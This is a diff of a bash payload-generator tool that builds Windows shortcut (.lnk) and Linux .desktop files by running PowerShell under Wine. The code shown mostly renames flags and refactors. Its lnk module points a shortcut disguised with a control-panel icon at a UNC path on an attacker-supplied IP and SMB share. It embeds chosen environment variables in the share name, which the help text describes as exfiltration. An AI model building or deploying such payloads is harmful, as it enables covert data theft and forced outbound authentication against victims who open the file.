@@ -82,14 +82,19 @@ function random_string() {
 function generate() {
     local payload="${1}"
 
+
     function shell_link() {
-        local temporary_file=$(mktemp --suffix '.ps1')
         local -A windowstyle=(
             [normal]=1
             [maximized]=3
             [minimized]=7
         )
+        local temp
+        local temporary_file
         local script
+        arguments=("WINEDEBUG=-all" "WINEARCH=win64"
+                "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")
+
         script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
         script+="\$ShortcutPath = \"${OUTPUT}\"\n"
         script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"
@@ -112,13 +117,11 @@ function generate() {
         elif [[ -n "${IP}" ]]
         then
             local unc
-
             if [[ -z "${SHARE}" ]]
             then
                 SHARE="$(random_string)"
                 if [[ -n "${ENVIRONMENT}" ]]
                 then
-                    local temp
                     while IFS="," read -ra variables
                     do
                         for variable in "${variables[@]}"
@@ -131,26 +134,26 @@ function generate() {
                     SHARE="${SHARE}_${ENVIRONMENT}"
                 fi
 
-                if [[ -z "${FILENAME}" ]]
+                if [[ -z "${NAME}" ]]
                 then
                     unc="\\\\\\${IP}\\\\${SHARE}"
-                elif [[ -n "${FILENAME}" ]]
+                elif [[ -n "${NAME}" ]]
                 then
-                    unc="\\\\\\${IP}\\\\${SHARE},select,${FILENAME}"
+                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                 fi
             elif [[ -n "${SHARE}" ]]
             then
-                if [[ -z "${FILENAME}" ]]
+                if [[ -z "${NAME}" ]]
                 then
                     unc="\\\\\\${IP}\\\\${SHARE}"
-                elif [[ -n "${FILENAME}" ]]
+                elif [[ -n "${NAME}" ]]
                 then
-                    unc="\\\\\\${IP}\\\\${SHARE},select,${FILENAME}"
+                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                 fi
             fi
 
             script+="\$Shortcut.TargetPath = 'C:/Windows/explorer.exe'\n"
-            script+="\$Shortcut.Arguments = '/root,\"${unc}\"'\n"
+            script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
         else
             print "error" "IP parameter must at least be passed!"
             quit 1
@@ -161,18 +164,14 @@ function generate() {
             script+="\$Shortcut.Description = \"${DESCRIPTION}\""
         fi
 
-        # Will set to image icon by default
-        if [[ -z "${ICON}" ]]
+        # Using a custom index icon
+        if [[ -n "${ICON}" ]]
         then
+            script+="\$Shortcut.IconLocation = '${ICON}'\n"
+        elif [[ -z "${ICON}" ]]
+        then
+            # Will set to control panel icon by default
             script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
-        elif [[ -f "${ICON}" ]]
-        then
-            # Using a file as a custom icon
-            script+="\$Shortcut.IconLocation = '${ICON}'\n"
-        elif [[ -n "${ICON}" ]]
-        then
-            # Using an index icon
-            script+="\$Shortcut.IconLocation = '${ICON}'\n"
         fi
 
         if [[ -z "${WINDOW}" ]]
@@ -191,21 +190,22 @@ function generate() {
         script+="\$Shortcut.Save()\n"
 
         # Save the temporary PowerShell script then remove it after generation
+        temporary_file=$(mktemp --suffix '.ps1')
         echo -e "${script}" > "${temporary_file}"
-        eval "WINEDEBUG=-all WINEARCH=win64 WINEPREFIX='${WINEPREFIX_DIRECTORY}' wine pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
+        eval "${arguments[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
+        rm -f "${temporary_file}"
 
         print "completed" "Payload has been generated!"
-        rm -f "${temporary_file}"
     }
 
     function desktop_entry() {
-        local -a arguments=("desktop-file-edit")
+        arguments=("desktop-file-edit")
 
-        if [[ -n "${FILENAME}" ]]
+        if [[ -n "${NAME}" ]]
         then
             arguments+=("--set-key='Encoding'")
             arguments+=("--set-value='UTF-8'")
-            arguments+=("--set-name='${FILENAME}'")
+            arguments+=("--set-name='${NAME}'")
             arguments+=("--set-key='Version'")
             arguments+=("--set-value='1.0'")
         else
@@ -298,40 +298,34 @@ Flags:
     -c, --command                       Specify a command to execute.
     -a, --arguments                     Optionally pass the arguments (except it is
                                         mandatory for 'lnk' payload module).
-
     -i, --ip                            Specify an IP address/hostname (applies with
                                         'lnk' payload module).
-
     -e, --environment                   Optionally pass the environment variables to
                                         exfiltrate.
-
     -s, --share                         Specify an SMB share (applies with -h flag
                                         when it's optional for 'lnk' payload module).
-
-    -f, --filename                      Specify a filename. It is optional when 'lnk'
+    -n, --name                          Specify a name. It is optional when 'lnk'
                                         payload module is specified (applies with -h flag).
                                         For 'desktop' payload module it is mandatory.
-
-    -ic, --icon                         Specify a custom icon.
+    --icon                         Specify a custom icon.
     -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                         'normal' is set by default if not specified.
                                         The available windowstyles are: 'normal', 'maximized',
                                         and 'minimized'. For 'desktop' payload it is set to
                                         'false', the available options are: 'true' and 'false'.
-
-    -wd, --workingdirectory             Specify a working directory.
+    --workingdirectory             Specify a working directory.
     -o, --output                        Specify an output.
     -v, --version                       Display the program's version number.
     -h, --help                          Display the help menu."
 
-    exit
+    exit 0
 }
 
 function main() {
     local directory
 
-    local options="p:c:a:i:e:s:f:d:ic:w:wd:o:v:h"
-    local long_options="payload:,command:,arguments:,ip:,environment:,share:,filename:,description:,icon:,window:,workingdirectory:,output:,version:,help"
+    local options="p:c:a:i:e:s:n:d:w:o:v:h"
+    local long_options="payload:,command:,arguments:,ip:,environment:,share:,name:,description:,icon:,window:,workingdirectory:,output:,version:,help"
     local parsed_options=$(getopt -o "${options}" -l "${long_options}" -n "$(basename "${0}")" -- "${@}")
 
     if ((${?} != 0))
@@ -369,15 +363,15 @@ function main() {
                 SHARE="${2}"
                 shift 2
                 ;;
-            -f | --filename)
-                FILENAME="${2}"
+            -n | --name)
+                NAME="${2}"
                 shift 2
                 ;;
             -d | --description)
                 DESCRIPTION="${2}"
                 shift 2
                 ;;
-            -ic | --icon)
+            --icon)
                 ICON="${2}"
                 shift 2
                 ;;
@@ -385,7 +379,7 @@ function main() {
                 WINDOW="${2,,}"
                 shift 2
                 ;;
-            -wd | --workingdirectory)
+            --workingdirectory)
                 WORKINGDIRECTORY="${2}"
                 shift 2
                 ;;
@@ -414,7 +408,7 @@ function main() {
     trap quit SIGINT
     check_dependencies
 
-    ((VERSION == 1)) && echo "${0} version: v1.0"
+    ((VERSION == 1)) && echo "${0} version: v2.0"
 
     if [[ -n "${OUTPUT}" ]]
     then
